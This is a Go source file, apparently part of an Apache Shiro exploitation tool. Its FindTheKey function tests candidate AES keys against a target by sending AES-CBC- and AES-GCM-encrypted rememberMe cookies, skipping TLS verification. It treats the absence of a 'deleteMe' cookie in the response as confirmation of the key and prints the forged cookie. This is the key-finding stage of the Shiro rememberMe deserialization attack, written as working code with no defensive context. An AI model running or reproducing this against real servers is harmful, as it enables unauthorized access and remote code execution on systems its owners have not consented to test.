package main

import (
	"crypto/tls"
	"encoding/base64"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func FindTheKey(ShiroKey string, Content []byte, TargetUrl string) (bool, string) {
	key, _ := base64.StdEncoding.DecodeString(ShiroKey)
	result := "[-] Key incorrect "

	RememberMe, err := AesCbcEncrypt(key, Content)
	if err != nil {
		return false, result
	}
	ok, _ := HttpRequest(RememberMe, TargetUrl)
	if ok {
		result = "[+] CBC-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
	} else {
		RememberMe, err = AesGcmEncrypt(key, Content)
		if err != nil {
			return false, result
		}
		ok, _ = HttpRequest(RememberMe, TargetUrl)
		if ok {
			result = "[+] GCM-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
		}
	}

	return ok, result
}

func HttpRequest(RememberMe string, TargetUrl string) (bool, error) {
	var tr *http.Transport
	if HttpProxy != "" {
		uri, _ := url.Parse(HttpProxy)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(uri),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	client := &http.Client{
		Timeout:   time.Duration(Timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse //不允许跳转
		}}
	req, err := http.NewRequest(strings.ToUpper(Method), TargetUrl, strings.NewReader(PostContent))
	if err != nil {
		return false, err
	}

	if strings.ToUpper(Method) == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", UserAgent)
	req.Header.Set("Cookie", NRemeberMe+"="+RememberMe)
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	var SetCookieAll string
	for i := range resp.Header["Set-Cookie"] {
		SetCookieAll += resp.Header["Set-Cookie"][i]
	}
	return !strings.Contains(SetCookieAll, NRemeberMe+"=deleteMe;"), nil
}
